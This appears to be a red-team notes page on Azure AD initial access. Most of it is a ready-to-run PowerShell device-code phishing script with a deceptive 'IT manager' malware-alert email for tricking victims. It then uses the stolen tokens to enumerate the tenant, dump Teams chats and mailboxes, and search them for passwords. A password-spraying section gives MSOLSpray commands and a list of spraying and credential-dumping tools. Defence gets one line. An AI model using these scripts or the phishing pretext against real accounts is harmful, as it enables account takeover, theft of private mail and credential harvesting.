# Initial Access

### Device Code Authentication Method - Phishing Attack <a href="#device-code-authentication-method-phishing-attack" id="device-code-authentication-method-phishing-attack"></a>

&#x20;

<img src="../../.gitbook/assets/image (9).png" alt="" data-size="original">

The basic idea to utilize device code authentication for phishing is the following.

1. An attacker connects to /devicecode endpoint and sends **client\_id** and **resource**
2. After receiving **verification\_uri** and **user\_code**, create an email containing a link to **verification\_uri** and **user\_code**, and send it to the victim.
3. Victim clicks the link, provides the code and completes the sign in.
4. The attacker receives **access\_token** and **refresh\_token** and can now mimic the victim.

Run the script below;&#x20;

Which is taken from o365 blog in the reference;

```
$body=@{
	"client_id" = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"resource" =  "https://graph.windows.net"
}


$authResponse = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0" -Body $body
$user_code =    $authResponse.user_code

######################################################################## 
########################################################################
Get-AADIntGlobalAdmins -UserPrincipalName "user@yourexample" -DisplayName "Exercise"

# Invoke the request to get device and user codes
# Send to attacker
# https://microsoft.com/devicelogin login

#Hi!,

#This is an urgent situation. You'r device is affected by malware and we are taking some malicious logs
#from your device. So we have deleted your device from our Azure AD resources.
#By using the code:  you need to reregister to https://microsoft.com/devicelogin and 
#resign all applications again.

#Your IT manager



########################################################################
########################################################################
# Already sent a phishing attack to victim now we are going to next step.

$continue = $true
$interval = $authResponse.interval
$expires =  $authResponse.expires_in

# Create body for authentication requests

$body=@{
	"client_id" =  "d3590ed6-52b3-4102-aeff-aad2292ab01c"
	"grant_type" = "urn:ietf:params:oauth:grant-type:device_code"
	"code" =       $authResponse.device_code
	"resource" =   "https://graph.windows.net"
}

# Loop while authorisation is pending or until timeout exceeded

while($continue)
{
	Start-Sleep -Seconds $interval
	$total += $interval

	if($total -gt $expires)
	{
		Write-Error "Timeout occurred"
		return
	}
				
	# Try to get the response. Will give 40x while pending so we need to try&catch

	try
	{
		$response = Invoke-RestMethod -UseBasicParsing -Method Post -Uri "https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0 " -Body $body -ErrorAction SilentlyContinue
	}
	catch
	{
		# This is normal flow, always returns 40x unless successful

		$details=$_.ErrorDetails.Message | ConvertFrom-Json
		$continue = $details.error -eq "authorization_pending"
		Write-Host $details.error

		if(!$continue)
		{
			# Not pending so this is a real error

			Write-Error $details.error_description
			return
		}
	}

	# If we got response, all okay!

	if($response)
	{
		break # Exit the loop

	}
}


#Then start running these commands 
# Enumerate AAD

Get-AADIntUsers -AccessToken $response.access_token | select displayname
Get-AADIntGlobalAdmins -AccessToken $response.access_token
Get-AADIntTenantID -AccessToken $response.access_token
Get-AADIntTenantDetails -AccessToken $response.access_token
get-aadintusermfa -AccessToken $response.access_token
```



**Limitation from Attacker Perspective**

* Victim should authenticate in 15 min
* Attackers logining to system so their logs will be there.

**Preventing**

* Conditional Access (CA)



**Reference**

[![](https://aadinternals.com/images/favicon-16x16.png)Introducing a new phishing technique for compromising Office 365 accounts](https://o365blog.com/post/phishing/)



**Azure AD Red Team First Action**

After getting tokens of user, We can go further to look MSTeam Chats and Outlook Email and search there some credentials.

Here is the step that you can find;

```

#Download TokenTactics from that github page https://github.com/rvrsh3ll/TokenTactics

Import-Module .\TokenTactics.psd1

# It will give you tokens that you will need.
Get-AzureToken -Client MSGraph


# Phish the user and get the tokens of user

RefreshTo-MSTeamsToken -domain <domain.name> 

#After getting phished get all Teams messages
Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token


#Search for a password in MSTeam messages

Get-AADIntTeamsMessages -AccessToken $MSTeamsToken.access_token | Select-String -Pattern Password


Connect-AzureAD -AadAccessToken $response.access_token -AccountId <email@domain.name>

Get-AzureADUser

# That will give you MSGraphToken variable with tokens inside
RefreshTo-MSGraphToken -domain <domain.name>


# Dump all emails with that command $MsGraphToken from RefreshTo-MsGraphToken commands result

Dump-OWAMailboxViaMSGraphApi -AccessToken $MSGraphToken.access_token -mailFolder inbox

# With that you can go and look via browser. 
RefreshTo-SubstrateToken -domain <domain.name>

# It will give you a request, follow instructions and use it in Burp and you will have
# browser view. 

Open-OWAMailboxInBrowser -AccessToken $SubstrateToken.access_token



```



### Password Spray  <a href="#password-spray" id="password-spray"></a>

After finding users on Azure AD we will try to login into their accounts this can be really noisy

so password spraying can be tried at that time. But we should be careful about not doing so many requests since windows blocking and also there is so much noise on the SIEM side.

`PS C:\Tools\MSOLSpray-master> Import-Module .\MSOLSpray.ps1`&#x20;

`PS C:\Tools\MSOLSpray-master> Invoke-MSOLSpray -UserList .\validemails.txt -Password [PASSWORD] -Verbose`

Here is the some tools for testing it.

* [MSOLSpray](https://github.com/dafthack/MSOLSpray) - A password spraying tool for Microsoft Online accounts (Azure/O365)
* [MSOLSpray.py](https://github.com/MartinIngesen/MSOLSpray) - A Python version of the MSOLSpray password spraying tool for Microsoft Online accounts (Azure/O365)
* [o365spray](https://github.com/0xZDH/o365spray) - Username enumeration and password spraying tool aimed at Microsoft O365
* [MFASweep](https://github.com/dafthack/MFASweep) - A tool for checking if MFA is enabled on multiple Microsoft Services Resources
* [adconnectdump](https://github.com/fox-it/adconnectdump) - Dump Azure AD Connect credentials for Azure AD and Active Directory

